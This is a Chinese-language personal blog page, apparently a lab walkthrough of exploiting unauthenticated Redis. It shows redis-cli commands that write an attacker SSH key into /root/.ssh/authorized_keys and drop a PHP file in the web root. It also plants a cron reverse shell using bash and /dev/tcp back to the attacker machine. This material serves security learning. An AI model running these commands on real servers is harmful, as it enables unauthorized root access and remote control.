@@ -1,0 +1,289 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Redis未授权访问 | 秋水的博客</title><meta name="keywords" content="未授权访问"><meta name="author" content="秋水"><meta name="copyright" content="秋水"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Redis未授权访问简介 Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助 Redis未授权访问漏洞  Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问">
+<meta property="og:url" content="http://example.com/2021/12/13/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
+<meta property="og:site_name" content="秋水的博客">
+<meta property="og:description" content="Redis未授权访问简介 Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助 Redis未授权访问漏洞  Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190923190409289.png">
+<meta property="article:published_time" content="2021-12-13T11:13:36.000Z">
+<meta property="article:modified_time" content="2021-01-03T11:15:48.440Z">
+<meta property="article:author" content="秋水">
+<meta property="article:tag" content="未授权访问">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190923190409289.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/12/13/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-03 19:15:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://img-blog.csdnimg.cn/20201102182821174.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">秋水的博客</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">Redis未授权访问</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-13T11:13:36.000Z" title="发表于 2021-12-13 19:13:36">2021-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-03T11:15:48.440Z" title="更新于 2021-01-03 19:15:48">2021-01-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
+<p><strong>Redis介绍</strong></p>
+<p><code>Redis</code>是一个开源的使用<code>ANSI C</code>语言编写、支持网络、可基于内存亦可持久化的日志型、<code>Key-Value</code>数据库，并提供多种语言的<code>API</code>。从<code>2010年3月15日</code>起，<code>Redis</code>的开发工作由<code>VMware</code>主持。从<code>2013年5月</code>开始，<code>Redis</code>的开发由<code>Pivotal</code>赞助</p>
+<p><strong>Redis未授权访问漏洞</strong></p>
+<ul>
+<li><p><code>Redis</code>因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行<code>flushall</code>来清空所有数据</p>
+</li>
+<li><p>攻击者可通过<code>EVAL</code>执行<code>lua</code>代码，或通过数据备份功能往磁盘写入后门文件</p>
+</li>
+<li><p>如果<code>Redis</code>以<code>root</code>身份运行，可以给<code>root</code>账户写入<code>SSH</code>公钥文件，直接通过<code>SSH</code>登录受害服务器</p>
+</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
+<h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>各位大佬们都喜欢用<code>kali linux</code>当作攻击机，<code>Ubuntu</code>或者<code>CentOS</code>当作靶机，这样会方便一些，但是使用<code>kali</code>当作攻击机，<code>redis-cli</code>命令也需要安装<code>redis</code>，我这里尝试了一下攻击机用<code>win10</code>，靶机用<code>kali</code></p>
+<p><strong>Linux软件安装</strong></p>
+<p> linux上安装命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0.tar.gz</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>然后修改配置文件<code>redis.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1前面加上#号   &#x2F;&#x2F;去掉ip绑定，允许除本地外的主机远程登录redis服务</span><br><span class="line">protected-mode设为no     &#x2F;&#x2F;关闭保护模式，允许远程连接redis服务</span><br><span class="line">daemonize设为yes    &#x2F;&#x2F;服务可后台运行</span><br></pre></td></tr></table></figure>
+
+<p>开启<code>redis</code>服务，默认端口是<code>6379</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;src&#x2F;redis-server redis-conf</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>redis-cli</code>命令的方式</p>
+<p>可以直接进入<code>src</code>文件夹 <code>./redis-cli -h 127.0.0.1 -p 6379</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2019092318394840.png" alt="img"></p>
+<p>下面的我使用的环境</p>
+<table>
+<thead>
+<tr>
+<th>攻击机</th>
+<th>靶机</th>
+<th>测试工具</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>windows 10 ：192.168.1.107</td>
+<td>kali linux ：192.168.1.109</td>
+<td>scrt、nc、nmap</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><code>redis</code>的安装不在多说了，<code>windows</code>版的<code>github</code>有，运行页面如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923185026292.png" alt="img"></p>
+<blockquote>
+<ul>
+<li>info查看信息</li>
+<li>set x “test”设置变量x为test</li>
+<li>get x 查看x的值</li>
+<li>flushall 是把整个redis数据库删除，一般情况下不要用！！！</li>
+<li>keys * 获取所有键名</li>
+<li>config set/get dir 顾名思义get是获取，set是设置，set可用于写文件，下面会用到</li>
+<li>config set/get dbfilename 与上属命令组合使用</li>
+<li>save 保存</li>
+</ul>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20190923190025224.png" alt="img"></p>
+<h3 id="攻击利用方法"><a href="#攻击利用方法" class="headerlink" title="攻击利用方法"></a>攻击利用方法</h3><hr>
+<p><strong>写ssh-keygen公钥然后使用私钥登陆</strong></p>
+<p>原理就是在数据库中插入一条数据，将本机的公钥作为<code>value，key</code>值随意，然后通过修改数据库的默认路径为<code>/root/.ssh</code>和默认的缓冲文件<code>authorized.keys</code>,把缓冲的数据保存在文件里，这样就可以再服务器端的<code>/root/.ssh</code>下生一个授权的<code>key</code></p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li><p><code>Redis</code>服务使用<code>ROOT</code>账号启动</p>
+</li>
+<li><p>服务器开放了<code>SSH</code>服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</p>
+</li>
+</ul>
+<p>使用<code>nmap</code>检查端口开放情况</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923190409289.png" alt="img"></p>
+<p>使用<code>redis-cli</code>连接到服务器，<code>redis-cli.exe -h 192.168.1.109 -p 6379</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20190923190648727.png" alt="img"></p>
+<p>使用<code>SCRT</code>使用公钥私钥对，操作步骤如下</p>
+<p><img src="https://img-blog.csdnimg.cn/2019092319080285.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190923190831942.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190923190948203.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190923191026376.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190923191128990.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>然后去该目录下，发现多出两个文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923191225211.png" alt="img">接下来使用<code>redis</code>将公钥内容写入目标主机的缓冲里</p>
+<p>使用文本模式打开<code>.pub</code>文件，字符串如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#x2F;sG4Y1CZkoBaEzwHfETvgeJO1&#x2F;gscJPZg0YTtgEVvk9Gju9DnHIzm1M8gF8lwysUkTMDc+xdHDplIjzgzvGeTBhLTgPsGtdsVggpXDGn6qRHFlxrDLqNb+8fLwv6Afhq7VZ0idvbH&#x2F;wKQDGTANzY6rFB3RBjOK3Pd8uL4RIa1JpoOX9oBTP94Xx9Ps+vUgxwaYw2hT&#x2F;ILMYBQuaVcuZ7JXLicaJEi0us+UEhoVNSjBAqJw0M0M9lVE4MXJxz99YVh3cnwx2v5&#x2F;XrkDX9xif4RUeLWAod2VGCsKgPmjZLSiNPKzrp9da22XRhIVHrBsqw7oCx0YyS+E9klbCrt+Oj1 qiushui@DESKTOP-9Q53NV6</span><br></pre></td></tr></table></figure>
+
+<p>首先查看靶机上的<code>/root/.ssh</code>文件夹下的文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923191857767.png" alt="img"></p>
+<p>通过攻击机远程<code>redis</code>执行命令如下，<code>\n</code>是换行，方式数据混淆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.109:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.1.109:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.1.109:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#x2F;sG4Y1CZkoBaEzwHfETvgeJO1&#x2F;gscJPZg0YTtgEVvk9Gju9DnHIzm1M8gF8lwysUkTMDc+xdHDplIjzgzvGeTBhLTgPsGtdsVggpXDGn6qRHFlxrDLqNb+8fLwv6Afhq7VZ0idvbH&#x2F;wKQDGTANzY6rFB3RBjOK3Pd8uL4RIa1JpoOX9oBTP94Xx9Ps+vUgxwaYw2hT&#x2F;ILMYBQuaVcuZ7JXLicaJEi0us+UEhoVNSjBAqJw0M0M9lVE4MXJxz99YVh3cnwx2v5&#x2F;XrkDX9xif4RUeLWAod2VGCsKgPmjZLSiNPKzrp9da22XRhIVHrBsqw7oCx0YyS+E9klbCrt+Oj1 qiushui@DESKTOP-9Q53NV6\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.109:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190923192345700.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/2019092319245054.png" alt="img"></p>
+<p>回到靶机查看是否生成<code>authorized_keys</code>文件，如下图</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923192548409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NTY5ODE0,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>设置<code>SCRT</code>使用公钥链接，</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40809627/article/details/94639424">具体可参照文章</a></p>
+<p>如下图</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923192725816.png" alt="img"></p>
+<p>使用公钥登录，如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923192852866.png" alt="img"></p>
+<p>输入之前设置的通行段语<code>123456</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20190923192932253.png" alt="img"></p>
+<p>成功登录</p>
+<p><img src="https://img-blog.csdnimg.cn/2019092319300293.png" alt="img"></p>
+<h4 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h4><p>当<code>redis</code>权限不高时，并且服务器开着<code>web</code>服务，在<code>redis</code>有<code>web</code>目录写权限时，可以尝试往<code>web</code>路径写<code>webshell</code></p>
+<p>执行以下命令</p>
+<ul>
+<li><p><code>192.168.1.109:6379&gt; config set dir /var/www/html/</code></p>
+</li>
+<li><p><code>192.168.1.109:6379&gt;config set dbfilename shell.php</code></p>
+</li>
+<li><p><code>192.168.1.109:6379&gt;set x &quot;&lt;?php phpinfo();?&gt;&quot;</code></p>
+</li>
+<li><p><code>192.168.1.109:6379&gt; save</code></p>
+</li>
+</ul>
+<p>这里我没开<code>web</code>服务我就不演示了，上一小节已证明可以写入成功</p>
+<p><strong>利用计划任务执行命令反弹shell</strong></p>
+<p>在<code>redis</code>以<code>root</code>权限运行时可以写<code>crontab</code>来执行命令反弹<code>shell</code></p>
+<p><a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">下载windows下的nc工具</a></p>
+<p>先在自己的服务器上监听一个端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/20190923194027555.png" alt="img"></p>
+<p>执行命令</p>
+<ul>
+<li><p><code>192.168.1.109:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.107/6666 0&gt;&amp;1\n&quot;</code></p>
+</li>
+<li><p><code>192.168.1.109:6379&gt; config set dir /var/spool/cron/</code></p>
+</li>
+<li><p><code>192.168.1.109:6379&gt; config set dbfilename root</code></p>
+</li>
+<li><p><code>192.168.1.109:6379&gt;save</code></p>
+</li>
+</ul>
+<p>操作失败，感觉应该是操作系统的问题，后续研究吧 吃饭先。。此处用<code>CentOS</code>作为靶机没有问题</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158065.html">参考文章</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">秋水</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/13/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">http://example.com/2021/12/13/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">秋水的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</a></div><div class="post_share"><div class="social-share" data-image="https://img-blog.csdnimg.cn/20190923190409289.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/23/php%E7%9A%84session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="prev-cover" src="https://img-blog.csdnimg.cn/20190616130354351.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">php的session反序列化</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/"><img class="next-cover" src="https://img-blog.csdnimg.cn/20190925161934724.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java反序列化漏洞简单理解</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">秋水</div><div class="author-info__description">个人技术博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.</span> <span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">引言</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">攻击利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">写webshell</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/23/php%E7%9A%84session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php的session反序列化"><img src="https://img-blog.csdnimg.cn/20190616130354351.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php的session反序列化"/></a><div class="content"><a class="title" href="/2021/12/23/php%E7%9A%84session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php的session反序列化">php的session反序列化</a><time datetime="2021-12-23T11:35:37.000Z" title="发表于 2021-12-23 19:35:37">2021-12-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/13/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问"><img src="https://img-blog.csdnimg.cn/20190923190409289.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis未授权访问"/></a><div class="content"><a class="title" href="/2021/12/13/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问">Redis未授权访问</a><time datetime="2021-12-13T11:13:36.000Z" title="发表于 2021-12-13 19:13:36">2021-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/" title="java反序列化漏洞简单理解"><img src="https://img-blog.csdnimg.cn/20190925161934724.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反序列化漏洞简单理解"/></a><div class="content"><a class="title" href="/2021/01/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/" title="java反序列化漏洞简单理解">java反序列化漏洞简单理解</a><time datetime="2021-01-03T09:20:37.000Z" title="发表于 2021-01-03 17:20:37">2021-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/03/%E5%86%8D%E6%8E%A274%E4%B9%8B%E5%85%A8%E7%89%88%E6%9C%AC%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/" title="再探74之全版本缓存问题"><img src="https://img-blog.csdnimg.cn/20210103170736537.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="再探74之全版本缓存问题"/></a><div class="content"><a class="title" 